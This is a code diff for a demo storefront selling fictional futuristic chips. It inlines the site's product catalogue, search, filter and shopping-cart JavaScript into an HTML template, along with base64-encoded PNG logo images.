+    id: 'prod-bio-synapse',
+    name: 'Bio-Digital Synapse v4.2',
+    description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces. Highly valued by prosthetic designers and direct cerebral link developers. Includes advanced noise filtering.',
+    price: 850.00,
+    image: '/uploads/bio_synapse.svg',
+    category: 'Interfaces'
+  },
+  {
+    id: 'prod-holo-matrix',
+    name: 'Holographic Display Matrix',
+    description: 'High-density spatial photonic projector. Generates interactive three-dimensional objects in mid-air without the need for goggles or specialized headwear. Supports standard light-field video formats.',
+    price: 1200.00,
+    image: '/uploads/holo_matrix.svg',
+    category: 'Displays'
+  },
+  {
+    id: 'prod-photon-core',
+    name: 'Photon Power Core',
+    description: 'Sub-atomic energy stabilizer chip that converts cosmic radiation into clean electrical power. Perfect for long-duration deep space probes and off-grid high-demand processing stations.',
+    price: 5000.00,
+    image: '/uploads/photon_core.svg',
+    category: 'Energy'
+  },
+  {
+    id: 'prod-gravitational-grid',
+    name: 'Gravitational Grid Controller',
+    description: 'The ultimate space-time engineering chip. Allows precise, localized micro-gravity field manipulation. Crucial for advanced heavy-duty manufacturing and quantum containment shields.',
+    price: 98000.00,
+    image: '/uploads/gravitational_grid.svg',
+    category: 'Energy'
+  }
+];
+
+// Fetch & Render Products
+async function fetchProducts(filters = {}) {
+  const container = document.getElementById('products-container');
+  if (!container) return;
+
+  container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
+    Establishing neural connection...
+  </div>\`;
+
+  let products = [];
+
+  try {
+    const params = new URLSearchParams();
+    if (filters.q) params.append('q', filters.q);
+    if (filters.category) params.append('category', filters.category);
+    
+    const res = await fetch(\`/api/products?\${params.toString()}\`);
+    if (res.ok) {
+      products = await res.json();
+    } else {
+      throw new Error('API unreachable');
+    }
+  } catch (err) {
+    console.warn('API stream unreachable, using fallback product matrix:', err);
+    products = JSON.parse(localStorage.getItem('future_chips_products')) || DEFAULT_PRODUCTS;
+    
+    if (filters.q) {
+      const q = filters.q.toLowerCase();
+      products = products.filter(p => p.name.toLowerCase().includes(q) || (p.description && p.description.toLowerCase().includes(q)));
+    }
+    if (filters.category) {
+      products = products.filter(p => p.category === filters.category);
+    }
+  }
+
+  // Sort products on client side
+  const sortOrder = document.getElementById('price-sort')?.value || 'asc';
+  products.sort((a, b) => {
+    return sortOrder === 'asc' ? a.price - b.price : b.price - a.price;
+  });
+
+  if (products.length === 0) {
+    container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
+      No cyber modules matching this frequency.
+    </div>\`;
+    return;
+  }
+
+  container.innerHTML = products.map(p => \`
+    <article class="product-card glass">
+      <div class="product-image-wrap">
+        <img src="\${p.image}" alt="\${p.name}" loading="lazy">
+      </div>
+      <div class="product-info">
+        <span class="product-category">\${p.category || 'Processors'}</span>
+        <h2 class="product-title">\${p.name}</h2>
+        <p class="product-desc">\${p.description || 'No description available.'}</p>
+        <div class="product-footer">
+          <div class="product-price">\${p.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
+          <div style="display: flex; gap: 0.5rem;">
+            <a href="/product.html?id=\${p.id}" class="btn btn-outline" style="padding: 0.6rem 1rem;">View Details</a>
+            <button onclick="addToCart('\${p.id}', '\${p.name.replace(/'/g, "\\\\'")}', \${p.price}, '\${p.image}')" class="btn btn-primary" style="padding: 0.6rem;">
+              +
+            </button>
+          </div>
+        </div>
+      </div>
+    </article>
+  \`).join('');
+}
+
+// Setup Filters & Search
+function setupFilters() {
+  const searchInput = document.getElementById('search-input');
+  const categoryFilter = document.getElementById('category-filter');
+  const priceSort = document.getElementById('price-sort');
+
+  let timeout = null;
+
+  const triggerSearch = () => {
+    fetchProducts({
+      q: searchInput?.value || '',
+      category: categoryFilter?.value || ''
+    });
+  };
+
+  searchInput?.addEventListener('input', () => {
+    clearTimeout(timeout);
+    timeout = setTimeout(triggerSearch, 300);
+  });
+
+  categoryFilter?.addEventListener('change', triggerSearch);
+  priceSort?.addEventListener('change', triggerSearch);
+}
+
+// Cart Functionality
+function setupCart() {
+  const openCartBtn = document.getElementById('open-cart-btn');
+  const closeCartBtn = document.getElementById('close-cart-btn');
+  const cartOverlay = document.getElementById('cart-overlay');
+  const cartPanel = document.getElementById('cart-panel');
+  const checkoutBtn = document.getElementById('checkout-btn');
+
+  const toggleCart = () => {
+    cartPanel?.classList.toggle('active');
+    cartOverlay?.classList.toggle('active');
+    renderCart();
+  };
+
+  openCartBtn?.addEventListener('click', toggleCart);
+  closeCartBtn?.addEventListener('click', toggleCart);
+  cartOverlay?.addEventListener('click', toggleCart);
+
+  // Cart Checkout
+  checkoutBtn?.addEventListener('click', () => {
+    if (cart.length === 0) {
+      alert('Your procurement queue is empty.');
+      return;
+    }
+    // For multiple items, we'll route to the first product in the cart.
+    // In a fully featured store you'd create a cart checkout session,
+    // but here we redirect them to the checkout page of the first item for simplicity,
+    // or checkout directly.
+    const firstItem = cart[0];
+    window.location.href = \`/product.html?id=\${firstItem.id}\`;
+  });
+
+  updateCartBadge();
+}
+
+function addToCart(id, name, price, image) {
+  const existing = cart.find(item => item.id === id);
+  if (existing) {
+    existing.qty += 1;
+  } else {
+    cart.push({ id, name, price, image, qty: 1 });
+  }
+  
+  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
+  updateCartBadge();
+  
+  // Slide cart open automatically on item added
+  const cartPanel = document.getElementById('cart-panel');
+  const cartOverlay = document.getElementById('cart-overlay');
+  if (cartPanel && !cartPanel.classList.contains('active')) {
+    cartPanel.classList.add('active');
+    cartOverlay?.classList.add('active');
+  }
+  
+  renderCart();
+}
+
+function removeFromCart(id) {
+  cart = cart.filter(item => item.id !== id);
+  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
+  updateCartBadge();
+  renderCart();
+}
+
+function updateCartBadge() {
+  const badge = document.getElementById('cart-badge-count');
+  if (badge) {
+    const totalQty = cart.reduce((sum, item) => sum + item.qty, 0);
+    badge.innerText = totalQty;
+    badge.style.display = totalQty > 0 ? 'block' : 'none';
+  }
+}
+
+function renderCart() {
+  const container = document.getElementById('cart-items-container');
+  const totalVal = document.getElementById('cart-total-value');
+  if (!container) return;
+
+  if (cart.length === 0) {
+    container.innerHTML = \`<div style="text-align: center; color: var(--text-muted); margin-top: 5rem;">
+      Your queue is empty.
+    </div>\`;
+    if (totalVal) totalVal.innerText = '$0.00';
+    return;
+  }
+
+  container.innerHTML = cart.map(item => \`
+    <div class="cart-item">
+      <img src="\${item.image}" alt="\${item.name}">
+      <div class="cart-item-details">
+        <h4 class="cart-item-title">\${item.name}</h4>
+        <div class="cart-item-price">\${item.price.toLocaleString(undefined, {minimumFractionDigits: 2})} x \${item.qty}</div>
+      </div>
+      <button onclick="removeFromCart('\${item.id}')" class="cart-item-remove">Remove</button>
+    </div>
+  \`).join('');
+
+  const total = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
+  if (totalVal) {
+    totalVal.innerText = \`\${total.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}\`;
+  }
+}
+
+</script>
 </body>
 </html>
 `;
@@ -7325,7 +8096,7 @@ footer {
     <p>&copy; 2026 <span id="site-footer-name">Future Chips</span>. Powered by live AI synthesis.</p>
   </footer>
 
-  <script src="/js/app.js"></script>
+  
   <script>
     // Specific script to load detail page content
     document.addEventListener('DOMContentLoaded', async () => {
@@ -7444,16 +8215,360 @@ footer {
       });
     }
   </script>
+<script>
+
+// Global Storefront JavaScript
+
+let cart = JSON.parse(localStorage.getItem('future_chips_cart')) || [];
+
+document.addEventListener('DOMContentLoaded', async () => {
+  // Load site details and theme settings
+  await loadSiteTheme();
+  
+  // Set up header scroll effect
+  const header = document.getElementById('main-header');
+  if (header) {
+    window.addEventListener('scroll', () => {
+      if (window.scrollY > 50) {
+        header.classList.add('scrolled');
+      } else {
+        header.classList.remove('scrolled');
+      }
+    });
+  }
+
+  // Load products list if on the storefront page
+  const productsContainer = document.getElementById('products-container');
+  if (productsContainer) {
+    await fetchProducts();
+    setupFilters();
+  }
+
+  // Set up cart triggers
+  setupCart();
+});
+
+// Load Site Settings (Theme & Site Name)
+async function loadSiteTheme() {
+  try {
+    const res = await fetch('/api/admin/settings');
+    if (!res.ok) throw new Error();
+    const settings = await res.json();
+    
+    if (settings) {
+      if (settings.primary_color) {
+        document.documentElement.style.setProperty('--primary-color', settings.primary_color);
+      }
+      if (settings.accent_color) {
+        document.documentElement.style.setProperty('--accent-color', settings.accent_color);
+      }
+      if (settings.background_color) {
+        document.documentElement.style.setProperty('--background-color', settings.background_color);
+      }
+
+      const siteLogos = document.querySelectorAll('#site-title-logo');
+      siteLogos.forEach(el => el.innerText = settings.site_name || 'Future Chips');
+      
+      const siteFooters = document.querySelectorAll('#site-footer-name');
+      siteFooters.forEach(el => el.innerText = settings.site_name || 'Future Chips');
+      
+      if (document.title.includes('Future Chips') && settings.site_name) {
+        document.title = document.title.replace('Future Chips', settings.site_name);
+      }
+      return;
+    }
+  } catch (err) {
+    console.warn('Failed to load dynamic site theme, reading saved local settings:', err);
+    const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
+    if (saved.primary_color) document.documentElement.style.setProperty('--primary-color', saved.primary_color);
+    if (saved.accent_color) document.documentElement.style.setProperty('--accent-color', saved.accent_color);
+    if (saved.background_color) document.documentElement.style.setProperty('--background-color', saved.background_color);
+    if (saved.site_name) {
+      const siteLogos = document.querySelectorAll('#site-title-logo');
+      siteLogos.forEach(el => el.innerText = saved.site_name);
+      const siteFooters = document.querySelectorAll('#site-footer-name');
+      siteFooters.forEach(el => el.innerText = saved.site_name);
+    }
+  }
+}
+
+const DEFAULT_PRODUCTS = [
+  {
+    id: 'prod-nano-chip',
+    name: 'Nano-Constructor Unit',
+    description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level. Features self-healing sub-circuits and simple smart-grid integration.',
+    price: 10.00,
+    image: '/uploads/nano_constructor.svg',
+    category: 'Processors'
+  },
+  {
+    id: 'prod-quantum-core',
+    name: 'Quantum Neural Core',
+    description: 'Next-generation computing processor featuring 1024 logical qubits. Designed for running localized deep learning simulations and processing high-density quantum state calculations. Operates at near-zero thermal emissions.',
+    price: 150.00,
+    image: '/uploads/quantum_core.svg',
+    category: 'Processors'
+  },
+  {
+    id: 'prod-bio-synapse',
+    name: 'Bio-Digital Synapse v4.2',
+    description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces. Highly valued by prosthetic designers and direct cerebral link developers. Includes advanced noise filtering.',
+    price: 850.00,
+    image: '/uploads/bio_synapse.svg',
+    category: 'Interfaces'
+  },
+  {
+    id: 'prod-holo-matrix',
+    name: 'Holographic Display Matrix',
+    description: 'High-density spatial photonic projector. Generates interactive three-dimensional objects in mid-air without the need for goggles or specialized headwear. Supports standard light-field video formats.',
+    price: 1200.00,
+    image: '/uploads/holo_matrix.svg',
+    category: 'Displays'
+  },
+  {
+    id: 'prod-photon-core',
+    name: 'Photon Power Core',
+    description: 'Sub-atomic energy stabilizer chip that converts cosmic radiation into clean electrical power. Perfect for long-duration deep space probes and off-grid high-demand processing stations.',
+    price: 5000.00,
+    image: '/uploads/photon_core.svg',
+    category: 'Energy'
+  },
+  {
+    id: 'prod-gravitational-grid',
+    name: 'Gravitational Grid Controller',
+    description: 'The ultimate space-time engineering chip. Allows precise, localized micro-gravity field manipulation. Crucial for advanced heavy-duty manufacturing and quantum containment shields.',
+    price: 98000.00,
+    image: '/uploads/gravitational_grid.svg',
+    category: 'Energy'
+  }
+];
+
+// Fetch & Render Products
+async function fetchProducts(filters = {}) {
+  const container = document.getElementById('products-container');
+  if (!container) return;
+
+  container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
+    Establishing neural connection...
+  </div>\`;
+
+  let products = [];
+
+  try {
+    const params = new URLSearchParams();
+    if (filters.q) params.append('q', filters.q);
+    if (filters.category) params.append('category', filters.category);
+    
+    const res = await fetch(\`/api/products?\${params.toString()}\`);
+    if (res.ok) {
+      products = await res.json();
+    } else {
+      throw new Error('API unreachable');
+    }
+  } catch (err) {
+    console.warn('API stream unreachable, using fallback product matrix:', err);
+    products = JSON.parse(localStorage.getItem('future_chips_products')) || DEFAULT_PRODUCTS;
+    
+    if (filters.q) {
+      const q = filters.q.toLowerCase();
+      products = products.filter(p => p.name.toLowerCase().includes(q) || (p.description && p.description.toLowerCase().includes(q)));
+    }
+    if (filters.category) {
+      products = products.filter(p => p.category === filters.category);
+    }
+  }
+
+  // Sort products on client side
+  const sortOrder = document.getElementById('price-sort')?.value || 'asc';
+  products.sort((a, b) => {
+    return sortOrder === 'asc' ? a.price - b.price : b.price - a.price;
+  });
+
+  if (products.length === 0) {
+    container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
+      No cyber modules matching this frequency.
+    </div>\`;
+    return;
+  }
+
+  container.innerHTML = products.map(p => \`
+    <article class="product-card glass">
+      <div class="product-image-wrap">
+        <img src="\${p.image}" alt="\${p.name}" loading="lazy">
+      </div>
+      <div class="product-info">
+        <span class="product-category">\${p.category || 'Processors'}</span>
+        <h2 class="product-title">\${p.name}</h2>
+        <p class="product-desc">\${p.description || 'No description available.'}</p>
+        <div class="product-footer">
+          <div class="product-price">\${p.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
+          <div style="display: flex; gap: 0.5rem;">
+            <a href="/product.html?id=\${p.id}" class="btn btn-outline" style="padding: 0.6rem 1rem;">View Details</a>
+            <button onclick="addToCart('\${p.id}', '\${p.name.replace(/'/g, "\\\\'")}', \${p.price}, '\${p.image}')" class="btn btn-primary" style="padding: 0.6rem;">
+              +
+            </button>
+          </div>
+        </div>
+      </div>
+    </article>
+  \`).join('');
+}
+
+// Setup Filters & Search
+function setupFilters() {
+  const searchInput = document.getElementById('search-input');
+  const categoryFilter = document.getElementById('category-filter');
+  const priceSort = document.getElementById('price-sort');
+
+  let timeout = null;
+
+  const triggerSearch = () => {
+    fetchProducts({
+      q: searchInput?.value || '',
+      category: categoryFilter?.value || ''
+    });
+  };
+
+  searchInput?.addEventListener('input', () => {
+    clearTimeout(timeout);
+    timeout = setTimeout(triggerSearch, 300);
+  });
+
+  categoryFilter?.addEventListener('change', triggerSearch);
+  priceSort?.addEventListener('change', triggerSearch);
+}
+
+// Cart Functionality
+function setupCart() {
+  const openCartBtn = document.getElementById('open-cart-btn');
+  const closeCartBtn = document.getElementById('close-cart-btn');
+  const cartOverlay = document.getElementById('cart-overlay');
+  const cartPanel = document.getElementById('cart-panel');
+  const checkoutBtn = document.getElementById('checkout-btn');
+
+  const toggleCart = () => {
+    cartPanel?.classList.toggle('active');
+    cartOverlay?.classList.toggle('active');
+    renderCart();
+  };
+
+  openCartBtn?.addEventListener('click', toggleCart);
+  closeCartBtn?.addEventListener('click', toggleCart);
+  cartOverlay?.addEventListener('click', toggleCart);
+
+  // Cart Checkout
+  checkoutBtn?.addEventListener('click', () => {
+    if (cart.length === 0) {
+      alert('Your procurement queue is empty.');
+      return;
+    }
+    // For multiple items, we'll route to the first product in the cart.
+    // In a fully featured store you'd create a cart checkout session,
+    // but here we redirect them to the checkout page of the first item for simplicity,
+    // or checkout directly.
+    const firstItem = cart[0];
+    window.location.href = \`/product.html?id=\${firstItem.id}\`;
+  });
+
+  updateCartBadge();
+}
+
+function addToCart(id, name, price, image) {
+  const existing = cart.find(item => item.id === id);
+  if (existing) {
+    existing.qty += 1;
+  } else {
+    cart.push({ id, name, price, image, qty: 1 });
+  }
+  
+  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
+  updateCartBadge();
+  
+  // Slide cart open automatically on item added
+  const cartPanel = document.getElementById('cart-panel');
+  const cartOverlay = document.getElementById('cart-overlay');
+  if (cartPanel && !cartPanel.classList.contains('active')) {
+    cartPanel.classList.add('active');
+    cartOverlay?.classList.add('active');
+  }
+  
+  renderCart();
+}
+
+function removeFromCart(id) {
+  cart = cart.filter(item => item.id !== id);
+  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
+  updateCartBadge();
+  renderCart();
+}
+
+function updateCartBadge() {
+  const badge = document.getElementById('cart-badge-count');
+  if (badge) {
+    const totalQty = cart.reduce((sum, item) => sum + item.qty, 0);
+    badge.innerText = totalQty;
+    badge.style.display = totalQty > 0 ? 'block' : 'none';
+  }
+}
+
+function renderCart() {
+  const container = document.getElementById('cart-items-container');
+  const totalVal = document.getElementById('cart-total-value');
+  if (!container) return;
+
+  if (cart.length === 0) {
+    container.innerHTML = \`<div style="text-align: center; color: var(--text-muted); margin-top: 5rem;">
+      Your queue is empty.
+    </div>\`;
+    if (totalVal) totalVal.innerText = '$0.00';
+    return;
+  }
+
+  container.innerHTML = cart.map(item => \`
+    <div class="cart-item">
+      <img src="\${item.image}" alt="\${item.name}">
+      <div class="cart-item-details">
+        <h4 class="cart-item-title">\${item.name}</h4>
+        <div class="cart-item-price">\${item.price.toLocaleString(undefined, {minimumFractionDigits: 2})} x \${item.qty}</div>
+      </div>
+      <button onclick="removeFromCart('\${item.id}')" class="cart-item-remove">Remove</button>
+    </div>
+  \`).join('');
+
+  const total = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
+  if (totalVal) {
+    totalVal.innerText = \`\${total.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}\`;
+  }
+}
+
+</script>
 </body>
 </html>
 `;
 
+// SERVE IMAGES & LOGOS
+const DOWNLOAD_PNG = Buffer.from('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', 'base64');
+const PAYPAL_PNG = Buffer.from('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